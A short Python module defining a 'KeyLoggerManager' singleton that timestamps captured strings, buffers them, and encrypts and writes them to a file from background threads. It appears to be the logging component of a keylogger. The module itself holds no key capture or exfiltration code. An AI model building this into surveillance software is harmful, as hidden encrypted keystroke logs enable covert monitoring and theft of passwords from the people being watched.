import threading
import time
from datetime import datetime



class  KeyLoggerManager:
    _instance = None

    def __new__(cls, file_writer, encryptor):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, file_writer, encryptor):
        if getattr(self, "_initialized", False):
            return
        self._initialized = True

        self.collect_interval = 5
        self.flush_interval = 300
        self.buffer = []
        self.running = True
        self.lock = threading.Lock()
        self.file_writer = file_writer
        self.encryptor = encryptor
        self.collect_thread = threading.Thread(target=self._collector, daemon=True)
        self.collect_thread.start()
        self.flush_thread = threading.Thread(target=self._flusher, daemon=True)
        self.flush_thread.start()

    def add_data(self, data: str):
        with self.lock:
            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            self.buffer.append(f"{timestamp} - {data}")

    def _collector(self):
        while self.running:
            time.sleep(self.collect_interval)


    def _flusher(self):
        while self.running:
            time.sleep(self.flush_interval)
            self.flush()

    def flush(self):
        with self.lock:
            if self.buffer:
                joined_data = "\n".join(self.buffer) + "\n"
                encrypted = self.encryptor.encrypt(joined_data)
                self.file_writer.write(encrypted)
                self.buffer.clear()

    def stop(self):
        self.running = False
        self.collect_thread.join()
        self.flush_thread.join()